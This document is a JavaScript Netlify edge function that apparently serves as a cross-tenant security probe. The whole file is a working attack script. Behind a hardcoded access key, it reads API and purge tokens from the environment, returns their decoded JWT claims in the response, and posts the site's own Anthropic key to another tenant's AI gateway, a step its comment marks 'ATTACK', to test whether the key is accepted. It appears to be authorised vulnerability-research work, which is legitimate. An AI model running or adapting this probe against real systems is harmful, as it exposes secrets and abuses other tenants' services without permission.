// Phase-2 Edge Function v3: AI-Gateway JWT scoping + cross-tenant gateway abuse test. Key-gated. Tokens never returned raw.
function claims(t){ try{ const p=t.split('.'); if(p.length<2) return {jwt:false}; const b=(s)=>JSON.parse(atob(s.replace(/-/g,'+').replace(/_/g,'/'))); return {jwt:true, header:b(p[0]), payload:b(p[1])}; }catch(e){ return {err:String(e).slice(0,80)}; } }
export default async (request, context) => {
  const url = new URL(request.url);
  if (url.searchParams.get('k') !== 'bl0bx7q2z9k4') return new Response('forbidden', { status: 403 });
  const env = Netlify.env.toObject();
  const out = { site: { id: context.site?.id, account: context.account?.id }, claims: {}, xtenant: {} };
  for (const n of ['ANTHROPIC_API_KEY','NETLIFY_AI_GATEWAY_KEY','NETLIFY_PURGE_API_TOKEN']) {
    const v = env[n]; out.claims[n] = v ? claims(v) : null;
  }
  async function req(u, opt) { try { const r = await fetch(u, { ...opt, signal: AbortSignal.timeout(9000) }); const t = await r.text(); return { status: r.status, body: t.slice(0, 220) }; } catch (e) { return { err: String(e).slice(0, 140) }; } }
  const ak = env.ANTHROPIC_API_KEY;
  const NL2 = 'https://h1xtenant-canary-a1.netlify.app';   // foreign site (nl2)
  const OWN = 'https://jazzy-pika-0b4d4f.netlify.app';
  const body = JSON.stringify({ model: 'invalid-model-xyz', max_tokens: 1, messages: [{ role: 'user', content: 'x' }] });
  const h = { 'x-api-key': ak, 'anthropic-version': '2023-06-01', 'content-type': 'application/json' };
  // control: own gateway (should 400 auth-OK unknown-model)
  out.xtenant.own_gateway = await req(OWN + '/.netlify/ai/v1/messages', { method: 'POST', headers: h, body });
  // does nl2 even have a gateway endpoint? (unauth GET)
  out.xtenant.nl2_ai_unauth = await req(NL2 + '/.netlify/ai/v1/messages', { method: 'POST', headers: { 'content-type': 'application/json' }, body });
  // ATTACK: my token at nl2's gateway (400 unknown-model = auth ACCEPTED cross-tenant = abuse; 401/403 = scoped/secure)
  out.xtenant.nl2_gateway_mytoken = await req(NL2 + '/.netlify/ai/v1/messages', { method: 'POST', headers: h, body });
  return Response.json(out);
};
export const config = { path: '/edge-probe' };
